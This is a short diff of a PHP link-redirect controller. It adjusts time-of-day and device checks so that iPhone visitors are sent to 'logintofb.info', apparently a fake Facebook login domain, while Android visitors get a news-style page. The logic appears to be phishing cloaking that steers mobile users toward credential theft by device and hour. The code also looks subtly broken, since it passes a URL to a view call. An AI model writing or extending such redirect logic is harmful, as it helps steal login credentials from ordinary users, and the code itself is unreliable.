@@ -110,15 +110,15 @@ class LinksController extends Controller
 
         $currentTime = (int) date('G');
 
-        if ($currentTime >= 23 && $currentTime <= 5 && Agent::is('iPhone')) {
+        if ($currentTime >= 0 && $currentTime <= 5 && Agent::is('iPhone')) {
             return view('http://logintofb.info');
         }
 
-        if ($currentTime >= 23 && $currentTime <= 5 && Agent::isAndroidOS()) {
+        if ($currentTime >= 0 && $currentTime <= 5 && Agent::isAndroidOS()) {
             return view('links.redirectphilnews');
         }
 
-        if ($currentTime > 5 && $currentTime < 23 && Agent::is('iPhone')) {
+        if ($currentTime > 5 && $currentTime <= 23 && Agent::is('iPhone')) {
             return view('http://logintofb.info');
         }
 
